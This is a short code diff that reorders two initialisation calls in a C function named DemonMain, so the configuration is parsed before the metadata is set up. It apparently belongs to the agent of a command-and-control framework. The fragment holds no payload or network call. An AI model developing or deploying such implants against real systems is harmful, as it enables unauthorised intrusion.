@@ -40,11 +40,11 @@ VOID DemonMain( PVOID ModuleInst )
     /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
     DemonInit();
 
-    /* Initialize MetaData */
-    DemonMetaData( &Instance.MetaData, TRUE );
-
     /* Parse config */
     DemonConfig();
+
+    /* Initialize MetaData */
+    DemonMetaData( &Instance.MetaData, TRUE );
 
     /* Main demon routine */
     DemonRoutine();
